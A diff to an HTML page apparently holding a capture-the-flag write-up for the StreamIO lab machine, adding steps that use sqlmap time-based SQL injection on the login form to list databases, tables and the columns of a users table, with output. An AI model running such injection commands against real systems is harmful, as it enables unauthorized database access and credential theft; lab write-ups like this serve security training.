@@ -317,6 +317,41 @@ web server operating system: Windows 10 or 2016 or 2019
 web application technology: Microsoft IIS 10.0, PHP, PHP 7.2.26
 back-end DBMS: Microsoft SQL Server 2019
 </code></pre></div>
+
+<p>Using sqlmap again, we retrieve the available datbases</p>
+<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/login.php&quot;</span> --method POST --data <span class="s2">&quot;username=FUZZ&amp;password=FUZZ&quot;</span> --batch --time-sec <span class="m">1</span> --dbs
+available databases <span class="o">[</span><span class="m">5</span><span class="o">]</span>:
+<span class="o">[</span>*<span class="o">]</span> model
+<span class="o">[</span>*<span class="o">]</span> msdb
+<span class="o">[</span>*<span class="o">]</span> STREAMIO
+<span class="o">[</span>*<span class="o">]</span> streamio_backup
+<span class="o">[</span>*<span class="o">]</span> tempdb
+</code></pre></div>
+
+<p>We couldn't extract any tables from <code>streamio_backup</code>, maybe due to missing permissions, but for <code>STREAMIO</code> it worked.</p>
+<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/login.php&quot;</span> --method POST --data <span class="s2">&quot;username=FUZZ&amp;password=FUZZ&quot;</span> --batch --time-sec <span class="m">1</span> -D STREAMIO --tables
+Database: STREAMIO
+<span class="o">[</span><span class="m">2</span> tables<span class="o">]</span>
++--------+
+<span class="p">|</span> movies <span class="p">|</span>
+<span class="p">|</span> users  <span class="p">|</span>
++--------+
+</code></pre></div>
+
+<p>Great a <code>users</code> table. Extracting now the columns...</p>
+<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/login.php&quot;</span> --method POST --data <span class="s2">&quot;username=FUZZ&amp;password=FUZZ&quot;</span> --batch --time-sec <span class="m">1</span> -D STREAMIO -T users --columns
+Database: STREAMIO
+Table: users
+<span class="o">[</span><span class="m">4</span> columns<span class="o">]</span>
++----------+-------+
+<span class="p">|</span> Column   <span class="p">|</span> Type  <span class="p">|</span>
++----------+-------+
+<span class="p">|</span> id       <span class="p">|</span> int   <span class="p">|</span>
+<span class="p">|</span> is_staff <span class="p">|</span> bit   <span class="p">|</span>
+<span class="p">|</span> password <span class="p">|</span> nchar <span class="p">|</span>
+<span class="p">|</span> username <span class="p">|</span> nchar <span class="p">|</span>
++----------+-------+
+</code></pre></div>
   </div>
   <div class="tag-cloud">
     <p>
